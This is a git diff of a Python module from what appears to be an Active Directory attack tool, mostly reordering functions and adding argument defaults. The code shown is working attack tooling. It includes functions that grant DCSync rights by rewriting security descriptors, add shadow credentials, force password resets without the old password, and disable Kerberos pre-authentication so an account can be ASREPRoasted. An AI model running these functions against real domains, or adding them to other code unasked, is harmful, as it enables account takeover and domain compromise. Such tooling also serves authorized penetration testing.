@@ -169,6 +169,40 @@ def delObject(conn, identity):
 
 
 @register_module
+def changePassword(conn, identity, new_pass):
+    """
+    Change the target password without knowing the old one using LDAPS or RPC
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
+        new_pass: new password for the target
+    """
+    ldap_conn = conn.getLdapConnection()
+    target_dn = resolvDN(ldap_conn, identity)
+
+    # If LDAPS is not supported use SAMR
+    if conn.conf.scheme == "ldaps":
+        modifyPassword.ad_modify_password(ldap_conn, target_dn, new_pass, old_password=None)
+        if ldap_conn.result['result'] == 0:
+            LOG.info('[+] Password changed successfully!')
+        else:
+            raise ResultError(ldap_conn.result)
+    else:
+        # Check if identity is sAMAccountName
+        sAMAccountName = identity
+        for marker in ["dn=", "s-1", "{"]:
+            if marker in identity:
+                ldap_filter = '(objectClass=*)'
+                entries = ldap_conn.search(target_dn, ldap_filter, attributes=['SAMAccountName'])
+                try:
+                    sAMAccountName = entries[0]['sAMAccountName']
+                except IndexError:
+                    raise NoResultError(target_dn, ldap_filter)
+                break
+
+        rpcChangePassword(conn, sAMAccountName, new_pass)
+
+
+@register_module
 def addUserToGroup(conn, member, group):
     """
     Add an object to a group
@@ -182,6 +216,31 @@ def addUserToGroup(conn, member, group):
     LOG.debug(f"[+] {group} found at {group_dn}")
     addMembersToGroups.ad_add_members_to_groups(ldap_conn, member_dn, group_dn, raise_error=True)
     LOG.info(f"[+] Adding {member_dn} to {group_dn}")
+
+
+@register_module
+def addForeignObjectToGroup(conn, user_sid, group_dn):
+    """
+    Add foreign principals (users or groups), coming from a trusted domain, to a group
+    Args:
+        foreign object sid
+        group dn in which to add the foreign object
+    """
+    ldap_conn = conn.getLdapConnection()
+    # https://social.technet.microsoft.com/Forums/en-US/6b7217e1-a197-4e24-9357-351c2d23edfe/ldap-query-to-add-foreignsecurityprincipals-to-a-group?forum=winserverDS
+    magic_user_dn = f"<SID={user_sid}>"
+    addMembersToGroups.ad_add_members_to_groups(ldap_conn, magic_user_dn, group_dn, raise_error=True)
+
+
+@register_module
+def delUserFromGroup(conn, member, group):
+    """
+    Remove member from group
+    """
+    ldap_conn = conn.getLdapConnection()
+    member_dn = resolvDN(ldap_conn, member)
+    group_dn = resolvDN(ldap_conn, group)
+    removeMembersFromGroups.ad_remove_members_from_groups(ldap_conn, member_dn, group_dn, True, raise_error=True)
 
 
 @register_module
@@ -231,31 +290,6 @@ def getComputersInOu(conn, base_ou):
 
 
 @register_module
-def delUserFromGroup(conn, member, group):
-    """
-    Remove member from group
-    """
-    ldap_conn = conn.getLdapConnection()
-    member_dn = resolvDN(ldap_conn, member)
-    group_dn = resolvDN(ldap_conn, group)
-    removeMembersFromGroups.ad_remove_members_from_groups(ldap_conn, member_dn, group_dn, True, raise_error=True)
-
-
-@register_module
-def addForeignObjectToGroup(conn, user_sid, group_dn):
-    """
-    Add foreign principals (users or groups), coming from a trusted domain, to a group
-    Args:
-        foreign object sid
-        group dn in which to add the foreign object
-    """
-    ldap_conn = conn.getLdapConnection()
-    # https://social.technet.microsoft.com/Forums/en-US/6b7217e1-a197-4e24-9357-351c2d23edfe/ldap-query-to-add-foreignsecurityprincipals-to-a-group?forum=winserverDS
-    magic_user_dn = f"<SID={user_sid}>"
-    addMembersToGroups.ad_add_members_to_groups(ldap_conn, magic_user_dn, group_dn, raise_error=True)
-
-
-@register_module
 def addDomainSync(conn, identity):
     """
     Give the right to perform DCSync with the user provided (You must have write permission on the domain LDAP object)
@@ -286,6 +320,7 @@ def addDomainSync(conn, identity):
 
     data = sd.getData()
     ldap_conn.modify(entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, [data])}, controls=controls)
+
 
 @register_module
 def delDomainSync(conn, identity):
@@ -323,40 +358,6 @@ def delDomainSync(conn, identity):
     attr_values = [sd.getData()]
 
     ldap_conn.modify(entry_dn, {'nTSecurityDescriptor': (ldap3.MODIFY_REPLACE, attr_values)}, controls=controls)
-
-
-@register_module
-def changePassword(conn, identity, new_pass):
-    """
-    Change the target password without knowing the old one using LDAPS or RPC
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
-        new_pass: new password for the target
-    """
-    ldap_conn = conn.getLdapConnection()
-    target_dn = resolvDN(ldap_conn, identity)
-
-    # If LDAPS is not supported use SAMR
-    if conn.conf.scheme == "ldaps":
-        modifyPassword.ad_modify_password(ldap_conn, target_dn, new_pass, old_password=None)
-        if ldap_conn.result['result'] == 0:
-            LOG.info('[+] Password changed successfully!')
-        else:
-            raise ResultError(ldap_conn.result)
-    else:
-        # Check if identity is sAMAccountName
-        sAMAccountName = identity
-        for marker in ["dn=", "s-1", "{"]:
-            if marker in identity:
-                ldap_filter = '(objectClass=*)'
-                entries = ldap_conn.search(target_dn, ldap_filter, attributes=['SAMAccountName'])
-                try:
-                    sAMAccountName = entries[0]['sAMAccountName']
-                except IndexError:
-                    raise NoResultError(target_dn, ldap_filter)
-                break
-
-        rpcChangePassword(conn, sAMAccountName, new_pass)
 
 
 @register_module
@@ -460,6 +461,7 @@ def addShadowCredentials(conn, identity, outfilePath=None):
     LOG.debug(new_values)
     LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % identity)
     ldap_conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
+    
     if ldap_conn.result['result'] == 0:
         LOG.debug("msDS-KeyCredentialLink attribute of the target object updated")
         if outfilePath is None:
@@ -467,6 +469,7 @@ def addShadowCredentials(conn, identity, outfilePath=None):
             LOG.info("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
         else:
             path = outfilePath
+
         certificate.ExportPEM(path_to_files=path)
         LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
         LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
@@ -494,36 +497,6 @@ def delShadowCredentials(conn, identity):
         LOG.info("msDS-KeyCredentialLink attribute of the target object updated")
     else:
         raise ResultError(ldap_conn.result)
-
-
-@register_module
-def setDontReqPreauthFlag(conn, identity, enable):
-    """
-    Enable or disable the DONT_REQ_PREAUTH flag for the given user in order to perform ASREPRoast
-    You must have a write permission on the UserAccountControl attribute of the target user
-    Args:
-        sAMAccountName, DN, GUID or SID of the target
-        set the flag on the UserAccountControl attribute (default is True)
-    """
-    ldap_conn = conn.getLdapConnection()
-
-    UF_DONT_REQUIRE_PREAUTH = 4194304
-    userAccountControl(ldap_conn, identity, enable, UF_DONT_REQUIRE_PREAUTH)
-
-
-@register_module
-def setAccountDisableFlag(conn, identity, enable):
-    """
-    Enable or disable the target account by setting the ACCOUNTDISABLE flag in the UserAccountControl attribute
-    You must have write permission on the UserAccountControl attribute of the target
-    Args:
-        identity: sAMAccountName, DN, GUID or SID of the target
-        enable: True to enable the identity or False to disable it
-    """
-    ldap_conn = conn.getLdapConnection()
-
-    UF_ACCOUNTDISABLE = 2
-    userAccountControl(ldap_conn, identity, enable, UF_ACCOUNTDISABLE)
 
 
 @register_module
@@ -555,3 +528,33 @@ def modifyGpoACL(conn, identity, gpo):
         LOG.info('LDAP server claims to have taken the sdriptor. Have fun')
     else:
         raise ResultError(ldap_conn.result)
+
+        
+@register_module
+def setDontReqPreauthFlag(conn, identity, enable="True"):
+    """
+    Enable or disable the DONT_REQ_PREAUTH flag for the given user in order to perform ASREPRoast
+    You must have a write permission on the UserAccountControl attribute of the target user
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the target
+        enable: True to enable DontReqPreAuth for the identity or False to disable it (default is True)
+    """
+    ldap_conn = conn.getLdapConnection()
+
+    UF_DONT_REQUIRE_PREAUTH = 4194304
+    userAccountControl(ldap_conn, identity, enable, UF_DONT_REQUIRE_PREAUTH)
+
+
+@register_module
+def setAccountDisableFlag(conn, identity, enable="False"):
+    """
+    Enable or disable the target account by setting the ACCOUNTDISABLE flag in the UserAccountControl attribute
+    You must have write permission on the UserAccountControl attribute of the target
+    Args:
+        identity: sAMAccountName, DN, GUID or SID of the target
+        enable: True to enable the identity or False to disable it (default is False)
+    """
+    ldap_conn = conn.getLdapConnection()
+
+    UF_ACCOUNTDISABLE = 2
+    userAccountControl(ldap_conn, identity, enable, UF_ACCOUNTDISABLE)
